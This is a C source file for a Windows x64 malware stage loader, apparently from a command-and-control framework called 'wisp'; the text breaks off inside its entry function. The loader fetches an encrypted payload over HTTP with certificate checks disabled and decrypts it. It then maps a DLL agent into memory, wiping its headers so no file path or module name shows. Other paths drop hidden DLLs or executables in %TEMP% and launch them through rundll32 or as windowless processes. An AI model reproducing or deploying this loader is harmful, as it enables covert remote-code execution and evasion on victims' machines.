// wisp-c-loader: Windows x64 stage bootstrap, no CRT.
//
// Flow: read the patched WISPCFG sentinel -> fetch the one-time stage JSON
// over WinHTTP -> derive sp-stage|<token> key (SHA-256) -> AES-256-GCM via
// CNG -> inspect stage2: a DLL is manual-mapped and entered in-place (Rust
// agent, nothing touches disk); an EXE is dropped in %TEMP% and started as a
// hidden subprocess (Go agent). The image type picks the mode, so the server
// only has to choose which agent it stages.
//
// The sentinel occupies a full 4096-byte file range so protocol.PatchBinary
// can patch it in place.
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winhttp.h>
#include <bcrypt.h>
#include <stddef.h>
#include <stdint.h>

#define CFG_SIZE 4096
#define TAG_SIZE 16

#ifndef NT_SUCCESS
#define NT_SUCCESS(s) (((NTSTATUS)(s)) >= 0)
#endif

__attribute__((used, section(".wispcfg")))
volatile unsigned char wisp_cfg[CFG_SIZE] = {'W', 'I', 'S', 'P', 'C', 'F', 'G', 1, 0, 0};

static HANDLE heap;
static HANDLE logfile = INVALID_HANDLE_VALUE;

void *memcpy(void *dst, const void *src, size_t n) {
    unsigned char *d = (unsigned char *)dst;
    const unsigned char *s = (const unsigned char *)src;
    while (n--) *d++ = *s++;
    return dst;
}

void *memset(void *dst, int c, size_t n) {
    unsigned char *d = (unsigned char *)dst;
    while (n--) *d++ = (unsigned char)c;
    return dst;
}

static DWORD slen(const char *s) {
    DWORD n = 0;
    while (s[n]) n++;
    return n;
}

static DWORD wlen(const wchar_t *s) {
    DWORD n = 0;
    while (s[n]) n++;
    return n;
}

static void dbg(const char *s) {
    DWORD written;
    if (logfile == INVALID_HANDLE_VALUE) return;
    WriteFile(logfile, s, slen(s), &written, NULL);
}

static void temp_name(wchar_t *dst, const wchar_t *name) {
    DWORD n = GetTempPathW(MAX_PATH, dst);
    if (n == 0 || n >= MAX_PATH) {
        dst[0] = 0;
        return;
    }
    DWORD i = 0;
    while (name[i] && n + i + 1 < MAX_PATH) {
        dst[n + i] = name[i];
        i++;
    }
    dst[n + i] = 0;
}

static void log_init(void) {
    char v[4];
    wchar_t path[MAX_PATH];
    if (GetEnvironmentVariableA("WISP_C_DEBUG", v, sizeof(v)) == 0) return;
    temp_name(path, L"wisp-c-loader.log");
    logfile = CreateFileW(path, FILE_APPEND_DATA, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
                          CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
}

static int find_bytes(const unsigned char *hay, DWORD n, const char *needle, DWORD nn) {
    if (nn == 0 || nn > n) return -1;
    for (DWORD i = 0; i + nn <= n; i++) {
        DWORD j = 0;
        while (j < nn && hay[i + j] == (unsigned char)needle[j]) j++;
        if (j == nn) return (int)i;
    }
    return -1;
}

// Keys are searched with their quotes so base64 bodies cannot false-match.
// Advance by the match offset: a per-byte rescan of the multi-megabyte ct
// field is quadratic and hangs the loader.
static int json_span(const char *json, DWORD n, const char *key, const char **val, DWORD *vlen) {
    DWORD kn = slen(key);
    DWORD i = 0;
    while (i + kn < n) {
        int off = find_bytes((const unsigned char *)(json + i), n - i, key, kn);
        if (off < 0) return 0;
        i += (DWORD)off;
        DWORD j = i + kn;
        while (j < n && (json[j] == ' ' || json[j] == '\t')) j++;
        if (j < n && json[j] == ':') {
            j++;
            while (j < n && (json[j] == ' ' || json[j] == '\t')) j++;
            if (j < n && json[j] == '"') {
                j++;
                DWORD start = j;
                while (j < n && json[j] != '"') j++;
                if (j >= n) return 0;
                *val = json + start;
                *vlen = j - start;
                return 1;
            }
        }
        i += kn;
    }
    return 0;
}

static int cfg_staged(char *out, DWORD cap) {
    const volatile unsigned char *p = wisp_cfg;
    if (p[0] != 'W' || p[1] != 'I' || p[2] != 'S' || p[3] != 'P' ||
        p[4] != 'C' || p[5] != 'F' || p[6] != 'G' || p[7] != 1) return 0;
    DWORD n = p[8] | ((DWORD)p[9] << 8);
    if (n == 0 || n > CFG_SIZE - 10) return 0;
    char *json = (char *)HeapAlloc(heap, 0, n + 1);
    if (!json) return 0;
    for (DWORD i = 0; i < n; i++) json[i] = (char)p[10 + i];
    json[n] = 0;
    const char *v = NULL;
    DWORD vn = 0;
    int ok = json_span(json, n, "\"staged\"", &v, &vn) && vn > 0 && vn < cap;
    if (ok) {
        memcpy(out, v, vn);
        out[vn] = 0;
    }
    HeapFree(heap, 0, json);
    return ok;
}

static int token_from_url(const char *url, char *out, DWORD cap) {
    const char *slash = NULL;
    for (const char *p = url; *p; p++) {
        if (*p == '/') slash = p;
    }
    if (!slash) return 0;
    const char *t = slash + 1;
    DWORD n = 0;
    while (t[n] && t[n] != '?' && t[n] != '#' && n + 1 < cap) {
        out[n] = t[n];
        n++;
    }
    out[n] = 0;
    return n > 0;
}

static int to_wide(const char *src, wchar_t *dst, int cap) {
    return MultiByteToWideChar(CP_UTF8, 0, src, -1, dst, cap) > 0;
}

static BYTE *fetch_stage(const wchar_t *url, DWORD *out_len) {
    HINTERNET ses = NULL, con = NULL, req = NULL;
    BYTE *buf = NULL;
    DWORD total = 0;
    wchar_t host[128];
    wchar_t path[768];
    URL_COMPONENTS uc;

    *out_len = 0;
    memset(&uc, 0, sizeof(uc));
    uc.dwStructSize = sizeof(uc);
    uc.lpszHostName = host;
    uc.dwHostNameLength = 128;
    uc.lpszUrlPath = path;
    uc.dwUrlPathLength = 768;
    if (!WinHttpCrackUrl(url, 0, 0, &uc)) return NULL;
    if (uc.dwHostNameLength == 0 || uc.dwHostNameLength >= 128 ||
        uc.dwUrlPathLength == 0 || uc.dwUrlPathLength >= 768) return NULL;
    host[uc.dwHostNameLength] = 0;
    path[uc.dwUrlPathLength] = 0;

    ses = WinHttpOpen(L"wisp-c-loader/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                      WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!ses) goto done;
    con = WinHttpConnect(ses, host, uc.nPort, 0);
    if (!con) goto done;

    DWORD flags = (uc.nScheme == INTERNET_SCHEME_HTTPS) ? WINHTTP_FLAG_SECURE : 0;
    req = WinHttpOpenRequest(con, L"GET", path, NULL, WINHTTP_NO_REFERER,
                             WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
    if (!req) goto done;
    if (flags) {
        DWORD sec = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                    SECURITY_FLAG_IGNORE_CERT_CN_INVALID;
        WinHttpSetOption(req, WINHTTP_OPTION_SECURITY_FLAGS, &sec, sizeof(sec));
    }
    if (!WinHttpSendRequest(req, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0))
        goto done;
    if (!WinHttpReceiveResponse(req, NULL)) goto done;

    DWORD status = 0, status_len = sizeof(status);
    if (!WinHttpQueryHeaders(req, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                             WINHTTP_HEADER_NAME_BY_INDEX, &status, &status_len,
                             WINHTTP_NO_HEADER_INDEX))
        goto done;
    if (status != HTTP_STATUS_OK) goto done;

    buf = (BYTE *)HeapAlloc(heap, 0, 1);
    if (!buf) goto done;
    for (;;) {
        DWORD avail = 0, got = 0;
        if (!WinHttpQueryDataAvailable(req, &avail) || avail == 0) break;
        if (total + avail > (64u << 20)) break;
        BYTE *next = (BYTE *)HeapReAlloc(heap, 0, buf, total + avail + 1);
        if (!next) break;
        buf = next;
        if (!WinHttpReadData(req, buf + total, avail, &got)) break;
        total += got;
        if (got == 0) break;
    }

done:
    if (req) WinHttpCloseHandle(req);
    if (con) WinHttpCloseHandle(con);
    if (ses) WinHttpCloseHandle(ses);
    if (buf && total == 0) {
        HeapFree(heap, 0, buf);
        buf = NULL;
    }
    *out_len = total;
    return buf;
}

static int b64_value(char c) {
    if (c >= 'A' && c <= 'Z') return c - 'A';
    if (c >= 'a' && c <= 'z') return c - 'a' + 26;
    if (c >= '0' && c <= '9') return c - '0' + 52;
    if (c == '+') return 62;
    if (c == '/') return 63;
    return -1;
}

static BYTE *b64_decode(const char *src, DWORD n, DWORD *out_len) {
    BYTE *out = (BYTE *)HeapAlloc(heap, 0, n / 4 * 3 + 3);
    if (!out) return NULL;
    DWORD k = 0;
    int val = 0, bits = -8;
    for (DWORD i = 0; i < n; i++) {
        if (src[i] == '=') break;
        int v = b64_value(src[i]);
        if (v < 0) {
            HeapFree(heap, 0, out);
            return NULL;
        }
        val = (val << 6) | v;
        bits += 6;
        if (bits >= 0) {
            out[k++] = (BYTE)((val >> bits) & 0xff);
            bits -= 8;
        }
    }
    *out_len = k;
    return out;
}

static int sha256(const BYTE *data, DWORD n, BYTE out[32]) {
    BCRYPT_ALG_HANDLE alg = NULL;
    BCRYPT_HASH_HANDLE hash = NULL;
    int ok = 0;
    if (!NT_SUCCESS(BCryptOpenAlgorithmProvider(&alg, BCRYPT_SHA256_ALGORITHM, NULL, 0))) return 0;
    if (!NT_SUCCESS(BCryptCreateHash(alg, &hash, NULL, 0, NULL, 0, 0))) goto done;
    if (!NT_SUCCESS(BCryptHashData(hash, (PUCHAR)data, n, 0))) goto done;
    if (!NT_SUCCESS(BCryptFinishHash(hash, out, 32, 0))) goto done;
    ok = 1;
done:
    if (hash) BCryptDestroyHash(hash);
    if (alg) BCryptCloseAlgorithmProvider(alg, 0);
    return ok;
}

static BYTE *gcm_open(const BYTE key[32], const BYTE *iv, DWORD ivn, const BYTE *ct, DWORD ctn,
                      DWORD *out_len) {
    BCRYPT_ALG_HANDLE alg = NULL;
    BCRYPT_KEY_HANDLE keyh = NULL;
    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO info;
    BYTE *out = NULL;
    DWORD got = 0;
    *out_len = 0;
    if (ctn < TAG_SIZE) return NULL;
    if (!NT_SUCCESS(BCryptOpenAlgorithmProvider(&alg, BCRYPT_AES_ALGORITHM, NULL, 0))) return NULL;
    if (!NT_SUCCESS(BCryptSetProperty(alg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_GCM,
                                      sizeof(BCRYPT_CHAIN_MODE_GCM), 0)))
        goto done;
    if (!NT_SUCCESS(BCryptGenerateSymmetricKey(alg, &keyh, NULL, 0, (PUCHAR)key, 32, 0)))
        goto done;
    BCRYPT_INIT_AUTH_MODE_INFO(info);
    info.pbNonce = (PUCHAR)iv;
    info.cbNonce = ivn;
    info.pbTag = (PUCHAR)(ct + ctn - TAG_SIZE);
    info.cbTag = TAG_SIZE;
    out = (BYTE *)HeapAlloc(heap, 0, ctn);
    if (!out) goto done;
    if (!NT_SUCCESS(BCryptDecrypt(keyh, (PUCHAR)ct, ctn - TAG_SIZE, &info, NULL, 0, out, ctn, &got, 0))) {
        HeapFree(heap, 0, out);
        out = NULL;
        goto done;
    }
    *out_len = got;
done:
    if (keyh) BCryptDestroyKey(keyh);
    if (alg) BCryptCloseAlgorithmProvider(alg, 0);
    return out;
}

// ---- PE manual mapper (DLL stage2) ----------------------------------------
//
// Mirrors agent-rs/staged/map: allocate at the preferred base when possible,
// copy headers/sections, apply base relocations, resolve imports, register the
// x64 unwind table, replay TLS callbacks and call the image entry point. The
// OS loader is never involved, so no module name or file path appears.

#define IMAGE_DLL 0x2000

typedef struct {
    BYTE *base;
    DWORD size;
    DWORD entry_rva;
    DWORD headers_len;
    DWORD export_rva;
    DWORD export_size;
    DWORD tls_rva;
    DWORD tls_size;
    ULONGLONG image_base;
} mapped_image;

typedef struct {
    const IMAGE_NT_HEADERS64 *nt;
    const IMAGE_SECTION_HEADER *secs;
    WORD nsec;
} pe_info;

static WORD rd16(const void *p) {
    WORD v;
    memcpy(&v, p, sizeof(v));
    return v;
}

static DWORD rd32(const void *p) {
    DWORD v;
    memcpy(&v, p, sizeof(v));
    return v;
}

static ULONGLONG rd64(const void *p) {
    ULONGLONG v;
    memcpy(&v, p, sizeof(v));
    return v;
}

static void wr32(void *p, DWORD v) { memcpy(p, &v, sizeof(v)); }

static void wr64(void *p, ULONGLONG v) { memcpy(p, &v, sizeof(v)); }

static int pe_parse(const BYTE *b, DWORD n, pe_info *out) {
    const IMAGE_DOS_HEADER *dos = (const IMAGE_DOS_HEADER *)b;
    if (n < sizeof(IMAGE_DOS_HEADER) || dos->e_magic != IMAGE_DOS_SIGNATURE) return 0;
    DWORD e = (DWORD)dos->e_lfanew;
    if (e < sizeof(IMAGE_DOS_HEADER) || e + 4 + sizeof(IMAGE_FILE_HEADER) > n) return 0;
    if (rd32(b + e) != IMAGE_NT_SIGNATURE) return 0;
    const IMAGE_NT_HEADERS64 *nt = (const IMAGE_NT_HEADERS64 *)(b + e);
    if (nt->FileHeader.SizeOfOptionalHeader < sizeof(IMAGE_OPTIONAL_HEADER64)) return 0;
    if (nt->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC) return 0;
    DWORD size = nt->OptionalHeader.SizeOfImage;
    DWORD headers = nt->OptionalHeader.SizeOfHeaders;
    if (size == 0 || size > (256u << 20) || headers == 0 || headers > n || headers > size) return 0;
    DWORD sec_at = e + 4 + sizeof(IMAGE_FILE_HEADER) + nt->FileHeader.SizeOfOptionalHeader;
    DWORD nsec = nt->FileHeader.NumberOfSections;
    if (nsec == 0 || nsec > 96 || (ULONGLONG)sec_at + (ULONGLONG)nsec * sizeof(IMAGE_SECTION_HEADER) > n)
        return 0;
    for (DWORD i = 0; i < nsec; i++) {
        const IMAGE_SECTION_HEADER *s = &((const IMAGE_SECTION_HEADER *)(b + sec_at))[i];
        DWORD virt = s->Misc.VirtualSize ? s->Misc.VirtualSize : s->SizeOfRawData;
        if (s->SizeOfRawData &&
            ((ULONGLONG)s->PointerToRawData + s->SizeOfRawData > n ||
             (ULONGLONG)s->VirtualAddress + virt > size))
            return 0;
    }
    out->nt = nt;
    out->secs = (const IMAGE_SECTION_HEADER *)(b + sec_at);
    out->nsec = (WORD)nsec;
    return 1;
}

static int pe_is_dll(const BYTE *b, DWORD n) {
    pe_info pe;
    return pe_parse(b, n, &pe) && (pe.nt->FileHeader.Characteristics & IMAGE_DLL);
}

static int dir_ok(const IMAGE_NT_HEADERS64 *nt, DWORD idx) {
    DWORD rva = nt->OptionalHeader.DataDirectory[idx].VirtualAddress;
    DWORD size = nt->OptionalHeader.DataDirectory[idx].Size;
    if (!rva || !size) return 0;
    return (ULONGLONG)rva + size <= nt->OptionalHeader.SizeOfImage;
}

static void unmap_image(mapped_image *img) {
    if (img->base) VirtualFree(img->base, 0, MEM_RELEASE);
    img->base = NULL;
}

static int apply_relocs(const pe_info *pe, BYTE *base, INT64 delta) {
    const IMAGE_NT_HEADERS64 *nt = pe->nt;
    if (!dir_ok(nt, IMAGE_DIRECTORY_ENTRY_BASERELOC)) return 0;
    DWORD rva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
    DWORD sz = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;
    DWORD size = nt->OptionalHeader.SizeOfImage;
    for (DWORD at = 0; at + 8 <= sz;) {
        DWORD page = rd32(base + rva + at);
        DWORD block = rd32(base + rva + at + 4);
        if (block < 8 || at + block > sz) return 0;
        for (DWORD o = 8; o + 2 <= block; o += 2) {
            WORD e = rd16(base + rva + at + o);
            WORD kind = e >> 12;
            DWORD off = e & 0x0fff;
            if (kind == 0) continue; // IMAGE_REL_BASED_ABSOLUTE
            if ((ULONGLONG)page + off + 8 > size) return 0;
            BYTE *slot = base + page + off;
            if (kind == 10) { // IMAGE_REL_BASED_DIR64
                wr64(slot, rd64(slot) + (ULONGLONG)delta);
            } else if (kind == 3) { // IMAGE_REL_BASED_HIGHLOW
                wr32(slot, (DWORD)((INT64)rd32(slot) + delta));
            } else {
                return 0;
            }
        }
        at += block;
    }
    return 1;
}

static int resolve_imports(const pe_info *pe, BYTE *base) {
    const IMAGE_NT_HEADERS64 *nt = pe->nt;
    if (!nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress) return 1;
    if (!dir_ok(nt, IMAGE_DIRECTORY_ENTRY_IMPORT)) return 0;
    DWORD rva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
    DWORD sz = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size;
    DWORD imgsize = nt->OptionalHeader.SizeOfImage;
    BYTE *de = base + rva;
    for (DWORD i = 0; i + 20 <= sz; i += 20, de += 20) {
        DWORD oft = rd32(de);
        DWORD name_rva = rd32(de + 12);
        DWORD first = rd32(de + 16);
        if (!oft && !name_rva && !first) return 1;
        if (!name_rva || name_rva >= imgsize || first >= imgsize ||
            (oft && oft >= imgsize))
            return 0;
        HMODULE mod = LoadLibraryA((LPCSTR)(base + name_rva));
        if (!mod) return 0;
        BYTE *names = base + (oft ? oft : first);
        BYTE *iat = base + first;
        for (;;) {
            if ((ULONGLONG)(names - base) + 8 > imgsize || (ULONGLONG)(iat - base) + 8 > imgsize)
                return 0;
            ULONGLONG thunk = rd64(names);
            if (!thunk) break;
            FARPROC proc;
            if (thunk & (1ull << 63)) {
                proc = GetProcAddress(mod, (LPCSTR)(ULONG_PTR)(thunk & 0xffff));
            } else {
                proc = GetProcAddress(mod, (LPCSTR)(base + (DWORD)thunk + 2));
            }
            if (!proc) return 0;
            wr64(iat, (ULONGLONG)(ULONG_PTR)proc);
            names += 8;
            iat += 8;
        }
    }
    return 0;
}

static void register_unwind(const pe_info *pe, BYTE *base) {
    const IMAGE_NT_HEADERS64 *nt = pe->nt;
    if (!dir_ok(nt, IMAGE_DIRECTORY_ENTRY_EXCEPTION)) return;
    DWORD rva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION].VirtualAddress;
    DWORD sz = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION].Size;
    typedef BOOLEAN(WINAPI * add_fn)(void *, DWORD, ULONG_PTR);
    HMODULE k32 = GetModuleHandleA("kernel32.dll");
    if (!k32) return;
    add_fn add = (add_fn)(void *)GetProcAddress(k32, "RtlAddFunctionTable");
    if (add) add((void *)(base + rva), sz / 12, (ULONG_PTR)base);
}

static void protect_sections(const pe_info *pe, BYTE *base) {
    for (DWORD i = 0; i < pe->nsec; i++) {
        const IMAGE_SECTION_HEADER *s = &pe->secs[i];
        if (s->Misc.VirtualSize == 0) continue;
        DWORD prot;
        if (s->Characteristics & IMAGE_SCN_MEM_WRITE) {
            prot = (s->Characteristics & IMAGE_SCN_MEM_EXECUTE) ? PAGE_EXECUTE_READWRITE : PAGE_READWRITE;
        } else {
            prot = (s->Characteristics & IMAGE_SCN_MEM_EXECUTE) ? PAGE_EXECUTE_READ : PAGE_READONLY;
        }
        DWORD old;
        VirtualProtect(base + s->VirtualAddress, s->Misc.VirtualSize, prot, &old);
    }
}

static int map_image(const BYTE *src, DWORD n, mapped_image *out) {
    pe_info pe;
    mapped_image img;
    memset(&img, 0, sizeof(img));
    memset(out, 0, sizeof(*out));
    if (!pe_parse(src, n, &pe)) return 0;

    const IMAGE_OPTIONAL_HEADER64 *opt = &pe.nt->OptionalHeader;
    DWORD size = opt->SizeOfImage;
    BYTE *base = (BYTE *)VirtualAlloc((LPVOID)(ULONG_PTR)opt->ImageBase, size,
                                      MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if (!base) base = (BYTE *)VirtualAlloc(NULL, size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if (!base) return 0;
    img.base = base;

    memcpy(base, src, opt->SizeOfHeaders);
    for (DWORD i = 0; i < pe.nsec; i++) {
        const IMAGE_SECTION_HEADER *s = &pe.secs[i];
        if (!s->SizeOfRawData) continue;
        DWORD virt = s->Misc.VirtualSize ? s->Misc.VirtualSize : s->SizeOfRawData;
        DWORD copy = s->SizeOfRawData < virt ? s->SizeOfRawData : virt;
        memcpy(base + s->VirtualAddress, src + s->PointerToRawData, copy);
    }

    INT64 delta = (INT64)(ULONG_PTR)base - (INT64)opt->ImageBase;
    if (delta != 0 && !apply_relocs(&pe, base, delta)) {
        unmap_image(&img);
        return 0;
    }
    if (!resolve_imports(&pe, base)) {
        unmap_image(&img);
        return 0;
    }
    register_unwind(&pe, base);
    protect_sections(&pe, base);

    img.size = size;
    img.entry_rva = opt->AddressOfEntryPoint;
    img.headers_len = opt->SizeOfHeaders;
    img.export_rva = opt->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    img.export_size = opt->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;
    img.tls_rva = opt->DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress;
    img.tls_size = opt->DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].Size;
    img.image_base = opt->ImageBase;
    *out = img;
    return 1;
}

static void call_image_entry(const mapped_image *img) {
    if (!img->entry_rva) return;
    typedef BOOL(WINAPI * entry_fn)(HINSTANCE, DWORD, LPVOID);
    ((entry_fn)(img->base + img->entry_rva))((HINSTANCE)img->base, DLL_PROCESS_ATTACH, NULL);
}

// The OS never fires TLS callbacks for a manual-mapped image; replay them.
static void tls_notify(const mapped_image *img, DWORD reason) {
    if (img->tls_size < 40) return;
    BYTE *t = img->base + img->tls_rva;
    ULONGLONG lo = (ULONGLONG)(ULONG_PTR)img->base;
    ULONGLONG hi = lo + img->size;
    INT64 delta = (INT64)lo - (INT64)img->image_base;
    ULONGLONG linked = rd64(t + 24);
    if (!linked) return;
    if (linked < lo || linked >= hi) linked = (ULONGLONG)((INT64)linked + delta);
    if (linked < lo || linked >= hi) return;
    ULONGLONG *list = (ULONGLONG *)(ULONG_PTR)linked;
    for (DWORD i = 0; i < 64; i++) {
        ULONGLONG cb = list[i];
        if (!cb) break;
        if (cb < lo || cb >= hi) cb = (ULONGLONG)((INT64)cb + delta);
        if (cb < lo || cb >= hi) break;
        ((void(WINAPI *)(void *, DWORD, void *))(ULONG_PTR)cb)(img->base, reason, NULL);
    }
}

static int str_eq(const char *a, const char *b) {
    while (*a && *a == *b) {
        a++;
        b++;
    }
    return *a == *b;
}

static void *resolve_export(const mapped_image *img, const char *want) {
    if (!img->export_rva || img->export_size < 40) return NULL;
    BYTE *d = img->base + img->export_rva;
    DWORD n_names = rd32(d + 24);
    DWORD funcs = rd32(d + 28);
    DWORD names = rd32(d + 32);
    DWORD ords = rd32(d + 36);
    if (!n_names || names >= img->size || funcs >= img->size || ords >= img->size) return NULL;
    for (DWORD i = 0; i < n_names; i++) {
        DWORD nr = rd32(img->base + names + i * 4);
        if (nr >= img->size) return NULL;
        if (!str_eq((const char *)(img->base + nr), want)) continue;
        if ((ULONGLONG)ords + (i + 1) * 2 > img->size) return NULL;
        WORD ord = rd16(img->base + ords + i * 2);
        if ((ULONGLONG)funcs + ((DWORD)ord + 1) * 4 > img->size) return NULL;
        DWORD rva = rd32(img->base + funcs + (DWORD)ord * 4);
        if (rva >= img->export_rva && rva < img->export_rva + img->export_size) return NULL;
        return img->base + rva;
    }
    return NULL;
}

static void wipe_headers(const mapped_image *img) {
    memset(img->base, 0, img->headers_len);
    DWORD old;
    VirtualProtect(img->base, 0x1000, PAGE_READONLY, &old);
}

// Runs the decrypted DLL in this process and never returns on success. The
// agent picks up its config from the patched sentinel inside the mapped image.
static int run_mapped(BYTE *plain, DWORD n) {
    mapped_image img;
    if (!map_image(plain, n, &img)) {
        dbg("map failed\n");
        return 0;
    }
    dbg("mapped\n");
    call_image_entry(&img);
    tls_notify(&img, DLL_PROCESS_ATTACH);
    void *start = resolve_export(&img, "WispStartEx");
    if (!start) start = resolve_export(&img, "WispStart");
    if (!start) {
        dbg("export missing\n");
        unmap_image(&img);
        return 0;
    }
    wipe_headers(&img);
    HeapFree(heap, 0, plain);
    dbg("entering agent\n");
    int rc = ((int(WINAPI *)(void *, void *, char *, int))start)(NULL, img.base, NULL, 0);
    dbg("agent returned\n");
    ExitProcess(rc ? 14 : 0);
}

// ---- embedded DLL (delivery=subprocess) -----------------------------------
//
// The server appends a config-patched DLL plus a 24-byte footer to this same
// loader image. At run time the loader writes that DLL to %TEMP% (hidden) and
// starts rundll32.exe as a child; only the footer marks the mode, so staged
// and embedded delivery share one template.

#define EMB_FOOTER 24

static int emb_magic_ok(const unsigned char *p) {
    static const char m[8] = {'W', 'I', 'S', 'P', 'E', 'M', 'B', 1};
    for (int i = 0; i < 8; i++)
        if (p[i] != (unsigned char)m[i]) return 0;
    return 1;
}

static BYTE *read_embedded(DWORD *out_len) {
    wchar_t path[MAX_PATH];
    DWORD n = GetModuleFileNameW(NULL, path, MAX_PATH);
    if (n == 0 || n >= MAX_PATH) return NULL;
    HANDLE f = CreateFileW(path, GENERIC_READ,
                           FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                           NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (f == INVALID_HANDLE_VALUE) return NULL;

    LARGE_INTEGER size, at;
    unsigned char foot[EMB_FOOTER];
    DWORD got = 0;
    BYTE *buf = NULL;
    if (!GetFileSizeEx(f, &size) || size.QuadPart < EMB_FOOTER) goto done;
    at.QuadPart = size.QuadPart - EMB_FOOTER;
    if (!SetFilePointerEx(f, at, NULL, FILE_BEGIN)) goto done;
    if (!ReadFile(f, foot, EMB_FOOTER, &got, NULL) || got != EMB_FOOTER) goto done;
    if (!emb_magic_ok(foot + 16)) goto done;

    ULONGLONG off = rd64(foot);
    DWORD len = rd32(foot + 8);
    DWORD flags = rd32(foot + 12);
    if (flags != 1 || len == 0 || off + len + EMB_FOOTER != (ULONGLONG)size.QuadPart) goto done;

    buf = (BYTE *)HeapAlloc(heap, 0, len);
    if (!buf) goto done;
    at.QuadPart = (LONGLONG)off;
    if (!SetFilePointerEx(f, at, NULL, FILE_BEGIN) ||
        !ReadFile(f, buf, len, &got, NULL) || got != len) {
        HeapFree(heap, 0, buf);
        buf = NULL;
        goto done;
    }
    *out_len = len;
done:
    CloseHandle(f);
    return buf;
}

static int write_temp_dll(const BYTE *data, DWORD n, wchar_t *path) {
    DWORD rnd = 0;
    BCryptGenRandom(NULL, (PUCHAR)&rnd, sizeof(rnd), BCRYPT_USE_SYSTEM_PREFERRED_RNG);
    rnd ^= GetTickCount() ^ (GetCurrentProcessId() << 16);
    temp_name(path, L"");
    DWORD base = wlen(path);
    if (base + 32 >= MAX_PATH) return 0;
    wsprintfW(path + base, L".d%08x.dll", rnd);

    HANDLE f = CreateFileW(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
    if (f == INVALID_HANDLE_VALUE) return 0;
    DWORD total = 0;
    while (total < n) {
        DWORD wrote = 0;
        if (!WriteFile(f, data + total, n - total, &wrote, NULL) || wrote == 0) {
            CloseHandle(f);
            return 0;
        }
        total += wrote;
    }
    CloseHandle(f);
    return 1;
}

static int spawn_rundll32(const wchar_t *dll) {
    wchar_t cmd[MAX_PATH + 64];
    if (!wsprintfW(cmd, L"rundll32.exe \"%s\",WispStart", dll)) return 0;
    STARTUPINFOW si;
    PROCESS_INFORMATION pi;
    memset(&si, 0, sizeof(si));
    memset(&pi, 0, sizeof(pi));
    si.cb = sizeof(si);
    if (!CreateProcessW(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
        return 0;
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return 1;
}

static int run_agent(const BYTE *data, DWORD n, wchar_t *path) {
    DWORD rnd = 0;
    BCryptGenRandom(NULL, (PUCHAR)&rnd, sizeof(rnd), BCRYPT_USE_SYSTEM_PREFERRED_RNG);
    rnd ^= GetTickCount() ^ (GetCurrentProcessId() << 16);
    temp_name(path, L"");
    DWORD base = wlen(path);
    if (base + 32 >= MAX_PATH) return 0;
    wsprintfW(path + base, L".w%08x.exe", rnd);

    HANDLE f = CreateFileW(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
    if (f == INVALID_HANDLE_VALUE) return 0;
    DWORD total = 0;
    while (total < n) {
        DWORD wrote = 0;
        if (!WriteFile(f, data + total, n - total, &wrote, NULL) || wrote == 0) {
            CloseHandle(f);
            return 0;
        }
        total += wrote;
    }
    CloseHandle(f);

    STARTUPINFOW si;
    PROCESS_INFORMATION pi;
    memset(&si, 0, sizeof(si));
    memset(&pi, 0, sizeof(pi));
    si.cb = sizeof(si);
    if (!CreateProcessW(path, NULL, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) return 0;
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return 1;
}

__attribute__((noreturn)) void loader_entry(void) {
    heap = GetProcessHeap();
    log_init();
    dbg("start\n");

    DWORD emb_len = 0;
    BYTE *emb = read_embedded(&emb_len);
    if (emb) {
        dbg("embedded dll\n");
        wchar_t dllpath[MAX_PATH];
        if (!write_temp_dll(emb, emb_len, dllpath)) {
            dbg("embedded write failed\n");
            ExitProcess(20);
        }
        HeapFree(heap, 0, emb);
        if (!spawn_rundll32(dllpath)) {
            dbg("rundll32 failed\n");
            ExitProcess(21);
        }
        dbg("spawned rundll32\n");
        ExitProcess(0);
    }

    char url[512];
    if (!cfg_staged(url, sizeof(url))) {
        dbg("no staged config\n");
        ExitProcess(2);
    }
    dbg("cfg ok\n");

    wchar_t wurl[512];
    if (!to_wide(url, wurl, 512)) {
        dbg("url wide failed\n");
        ExitProcess(3);
    }

    DWORD resp_len = 0;
